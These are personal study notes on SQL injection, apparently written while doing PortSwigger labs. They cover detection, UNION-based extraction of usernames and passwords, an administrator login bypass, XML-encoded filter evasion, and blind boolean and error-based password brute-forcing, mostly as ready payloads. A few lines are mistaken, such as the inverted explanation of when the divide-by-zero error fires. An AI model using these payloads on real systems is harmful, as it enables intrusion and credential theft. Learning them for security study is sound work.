# SQL Injections
## Detection
```
'
'OR 1=1+--+
'OR 1=2+--+
time-delay payloads
triggering out-of-band network interaction
```
## Examining database
### Versions:
* Oracle DB version: `SELECT * FROM v$version`
* MySQL: `SELECT @@version`
* PostgreSQL: `SELECT version()`

DO AGAIN:
[LAB](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
[LAB](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

### Contents of DB:
* Obtaining database tables (on most of DBs except Oracle): `SELECT * FROM information_schema.tables`
* Obtaining columns: `SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
* Oracle: `SELECT * FROM all_tables`, `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`

NOTE: It's good idea to query Oracle table 'dual'  

*Example of workflow*
```
' UNION SELECT NULL -- 
' UNION SELECT NULL, NULL -- 
' UNION SELECT @@version, NULL --
' UNION SELECT table_name,NULL FROM information_schema.tables -- 
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table='<table_name>' -- 
' UNION SELECT username, password FROM '<table_name>' -- 
```
## SQLi in different contexts
SQLi could be placed in JSON/XML and also could be obfuscated:
```xml
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```
We obfuscate symbols like binary or unicode  
Also we can use Hackvertor plugin for Burp (for encoding in xml use hex entities)  
If wee see that SQLi returns only one column, we can concatenate like this:
```
1 UNION SELECT username || '~' || password FROM users
```

REPEAT THIS [LAB](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

## Examples
### Retrievieng hidden data
`https://insecure-website.com/products?category=Gifts`
When user clicks on the *Gifts* category, browser requests URL from above  
SQL query:
`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
Here *released* means that product is released and could be viewed by users. If we change released value to 0, we will be able to see all the products  
URL:
`https://insecure-website.com/products?category=Gifts'--`
Query:
`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`
Or we can use next query:
`https://insecure-website.com/products?category=Gifts'+OR+1=1--`
And the query will be:
`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`
1=1 returns True, so query will return all product from category *Gifts*

### Subverting application logic
If user sends login wiener and pass bluecheese, app will let him in  
Query:
`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
If we enter `administrator'--` we will get in as administrator without checking password, because query will be next:
`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`

### Retrieving data from other database tables
```
SELECT name, description FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users--
```

## UNION SQLi
### Determining the number of columns
order by method:
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```
null method:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```

In Oracle we always need to specify FROM. For this purposes we have 'dual' table.  

NOTE: COMMENT COULD BE -- OR #  
To detect certain data type (e.g. string), we can place it inside of series of NULL queries:
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

### Retrieving multiple values within a single column
`' UNION SELECT username || '~' || password FROM users--` (Oracle)
Other DBs:
* Microsoft: `'foo'+'bar'`
* Postgres: `'foo'||'bar'`
* MySQL: `'foo' 'bar'` (note the space) or `CONCAT('foo','bar')`

### Blind SQL injections
* Triggered by changing logic of query (boolean results, divide-by-zero etc)
* Time delay of processing query
* Out-of-band network ineraction

#### Conditional responses
Example:  
Site uses tracking cookies with some token which is compared to tokens in DB and if it appears to be there, site returns hello message  
If we add `AND '1'='1` nothing will change because it's True statement  
But if we add `AND '1'='2` it will fail and we will detect Blind SQLi  
We can use it to brute password symbol by symbol like this:
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm        #returns True, meaning that 1 symbol of pass is greater then m
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't        #returns False, meaning that 1 symbol of pass is less then t
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's        #returns True, meaning that 1 symbol of pass is s
```
Note: SUBSTRING() function could be named SUBSTR() on some DBs  
To check next symbol use SUBSTRING((...), 2, 1)  
it's good idea to use Burp Intruder or Python script

#### Error-based SQLi
In such case we force DB to do smth which throws an error  
For example we can force DB to try divide-by-zero:
```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a          # nothing happens, because 1=2 is False and we just evaluate a to a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a          # we force DB to 1/0 because 1=1 is True
```
```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
xyz' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a') THEN TO_CHAR(1/0) ELSE 'Z' END FROM dual) = 'Z
```
In such case if 1 character of password is more then 'm', nothing happens. But if it's smaller, we force DB to 1/0, which throws an error  
For different DBs:
* Oracle: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual `
* Microsoft: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END `
* Postgres: `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`
* MySQL: `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`

### Second-order SQLi
SQLi which is stored inside server/database and executed later with another HTTP request. Also called stored SQLi  




